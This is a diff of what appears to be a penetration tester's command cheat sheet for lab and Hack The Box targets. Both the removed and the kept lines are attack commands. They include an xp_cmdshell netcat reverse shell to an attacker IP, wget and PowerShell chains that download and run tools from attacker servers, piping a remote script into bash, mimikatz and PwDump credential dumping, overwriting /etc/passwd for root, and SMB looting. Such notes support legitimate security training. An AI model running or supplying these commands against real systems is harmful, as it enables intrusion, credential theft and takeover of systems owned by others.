@@ -1,17 +1,10 @@
 
-nmap -sT -sU -sV -O -T4 -A -Pn --open --max-retries 4 --max-scan-delay 1s --defeat-rst-ratelimit --dns-servers 10.11.1.220,10.11.1.221 --disable-arp-ping --script-args unsafe=1 -oN /root/Documents/Recon/10.11.1.125/scans/10.11.1.125.nmap -oX /root/Documents/Recon/10.11.1.125/scans/10.11.1.125_nmap_scan_import.xml 10.11.1.125
-
-nmap -sT -sU -sV -O -T4 -A -Pn --open --max-retries 4 --max-scan-delay 1s --defeat-rst-ratelimit --dns-servers 10.11.1.220,10.11.1.221 --disable-arp-ping --script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv,unsafe=1 -oN /root/Documents/Recon/10.11.1.125/scans/10.11.1.125.nmap -oX /root/Documents/Recon/10.11.1.125/scans/10.11.1.125_nmap_scan_import.xml 10.11.1.125
-
 nmap -sV --script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv,unsafe=1 10.11.1.136
 
 5olasa: nmap -Pn -n -v -v -sV -sC 10.10.10.178
 
 Get-ADObject -Filter 'msds-lastknownrdn -eq "TempAdmin"' -IncludeDeletedObjects -Properties cascadeLegacyPwd
 
-Invoke-WebRequest -URI http://10.10.16.121/Tools/CShell.exe -OutFile shell.exe
-
-smbclient '\\10.10.10.178\Users' -c 'prompt OFF;recurse ON;lcd '/root/Documents/HackTheBox/Monteverde/10.10.10.172/loot';mget *' -U 'TempUser'
 
 1> exec xp_cmdshell 'C:\share\nc.exe 10.11.0.38 1234 -e cmd'
 2> go
@@ -27,28 +20,12 @@ smbclient '\\10.10.10.182\Data' -c 'prompt OFF;recurse ON;lcd '.';mget *' -U 'r.
 
 ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
 
-x64 Compile: x86_64-w64-mingw32-gcc Source.c -o File.exe
-x32 Compile: i686-w64-mingw32-gcc Source.c -o File.exe -lws2_32
 
 gcc '/usr/share/exploitdb/exploits/windows/remote/117.c' -o Desktop/Findings/RPC.so
 msfvenom -p windows/shell_reverse_tcp --list-options
-rdesktop 10.11.1.31 -r disk:share=/root/Desktop/Findings
+
 ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 10.11.1.24 -l username
 
-wget http://10.11.0.42/Tools/whoami && 
-wget http://10.11.0.42/Tools/rootme && 
-wget http://10.11.0.42/Scripts/Linux_LPE_Checker.py && 
-wget http://10.11.0.42/Scripts/Linux_LPE_Checker_2.sh
-
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://10.10.16.121/Tools/wget.exe','wget.exe') }" && wget "http://10.10.16.121/Tools/7za.dll" && wget "http://10.10.16.121/Tools/7za.exe" && wget "http://10.10.16.121/Tools/Win.7z" && 7za x Win.7z && cd Win && run.bat
-
-wget http://10.11.0.38/Tools/Linux.tar.xz && tar -xvf Linux.tar.xz && cd Linux && whoami && python Linux_LPE_Checker.py > LPE1.txt && Linux_LPE_Checker_2.sh standard > LPE2.txt && hershell64
-
-powershell -command "& {(New-Object Net.WebClient).DownloadFile('http://10.11.0.42/Tools/PwDump.exe','PwDump.exe')}"
-
-
-python -c 'import pty; pty.spawn("/bin/sh")'
-python -c 'import pty; pty.spawn("/bin/bash")'
 
 
 python -m SimpleHTTPServer 80
@@ -67,7 +44,7 @@ gcc sendmail.c -o sendmail.so
 
 echo root::0:0:root:/root:/bin/bash > /etc/passwd && su && id
 
-export PATH=$PATH:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/bin:/sbin 
+
 
 
 bash <(wget -qO- http://10.10.16.6/Tools/Linux/Linux_LPE_Checker_2.sh) standard
@@ -86,8 +63,7 @@ sshuttle -r Hacker@10.11.1.252:22000 10.2.2.0/24
 
 
 #####Windows#######
-New-PSSession -Credential (Get-Credential) -ComputerName 10.10.10.182 -Authentication Negotiate 
-Enter-PSSession
+
 
 .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
 ldapsearch -x -h 10.10.10.182 -D '' -w '' -b "DC=cascade,DC=local"
